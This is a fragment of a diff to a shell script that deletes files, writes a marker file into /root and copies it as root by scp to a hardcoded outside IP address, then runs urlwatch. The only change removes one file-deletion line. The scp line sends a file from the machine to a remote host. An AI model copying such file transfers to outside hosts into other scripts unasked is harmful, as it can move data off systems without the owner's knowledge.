@@ -45,5 +45,4 @@ rm -r $output
 echo '1'>/root/1scan.txt ; scp /root/1scan.txt root@45.199.152.172:/root
 > $var ; cat /root/run/3.txt > /root/run/3_3.txt
 fi
-rm /root/run/3.txt
 urlwatch
